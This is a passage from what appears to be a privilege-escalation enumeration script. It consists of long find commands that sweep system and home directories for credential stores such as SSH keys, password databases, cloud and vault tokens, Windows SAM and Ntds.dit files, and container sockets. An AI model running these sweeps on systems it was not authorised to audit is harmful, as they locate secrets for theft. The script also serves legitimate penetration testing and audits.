\"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"agent*\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"exports\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`


  wait # Always wait at the end
  CONT_THREADS=0 #Reset the threads counter

elif echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets || echo $CHECKS | grep -q software_information || echo $CHECKS | grep -q interesting_files; then

  printf $GREEN"Caching directories "$NC

  CONT_THREADS=0
  # FIND ALL KNOWN INTERESTING SOFTWARE FILES
  FIND_DIR_APPLICATIONS=`eval_bckgrd "find ${ROOT_FOLDER}applications -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_BIN=`eval_bckgrd "find ${ROOT_FOLDER}bin -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_CACHE=`eval_bckgrd "find ${ROOT_FOLDER}.cache -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_CDROM=`eval_bckgrd "find ${ROOT_FOLDER}cdrom -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_ETC=`eval_bckgrd "find ${ROOT_FOLDER}etc -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \"system.d\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"kubernetes\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"kube-proxy\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"kubelet\" -o -name \"pam.d\" -o -name \"gcloud\" -o -name \"system-connections\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" -o -name \"bind\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_HOMESEARCH=`eval_bckgrd "find $HOMESEARCH -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_MEDIA=`eval_bckgrd "find ${ROOT_FOLDER}media -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_MNT=`eval_bckgrd "find ${ROOT_FOLDER}mnt -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_OPT=`eval_bckgrd "find ${ROOT_FOLDER}opt -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_PRIVATE=`eval_bckgrd "find ${ROOT_FOLDER}private -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_SBIN=`eval_bckgrd "find ${ROOT_FOLDER}sbin -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_SNAP=`eval_bckgrd "find ${ROOT_FOLDER}snap -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_SRV=`eval_bckgrd "find ${ROOT_FOLDER}srv -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_TMP=`eval_bckgrd "find ${ROOT_FOLDER}tmp -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_USR=`eval_bckgrd "find ${ROOT_FOLDER}usr -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" -o -name \"bind\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_VAR=`eval_bckgrd "find ${ROOT_FOLDER}var -type d -name \"legacy_credentials\" -o -name \"neo4j\" -o -name \"concourse-keys\" -o -name \"sites-enabled\" -o -name \"roundcube\" -o -name \"*jenkins\" -o -name \"concourse-auth\" -o -name \"filezilla\" -o -name \".svn\" -o -name \".bluemix\" -o -name \"ldap\" -o -name \"zabbix\" -o -name \"keyrings\" -o -name \".cloudflared\" -o -name \".irssi\" -o -name \"sentry\" -o -name \"couchdb\" -o -name \"nginx\" -o -name \"kubernetes\" -o -name \"ErrorRecords\" -o -name \"cacti\" -o -name \"postfix\" -o -name \".password-store\" -o -name \"doctl\" -o -name \"seeddms*\" -o -name \"mysql\" -o -name \"dirsrv\" -o -name \".docker\" -o -name \".vnc\" -o -name \"kube-proxy\" -o -name \"ipa\" -o -name \"varnish\" -o -name \"kubelet\" -o -name \"gcloud\" -o -name \"logstash\" -o -name \"environments\" -o -name \".kube*\" -o -name \"bind\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_CONCOURSE_AUTH=`eval_bckgrd "find ${ROOT_FOLDER}concourse-auth -type d -name \"concourse-auth\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_CONCOURSE_KEYS=`eval_bckgrd "find ${ROOT_FOLDER}concourse-keys -type d -name \"concourse-keys\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_APPLICATIONS=`eval_bckgrd "find ${ROOT_FOLDER}applications -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_BIN=`eval_bckgrd "find ${ROOT_FOLDER}bin -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name 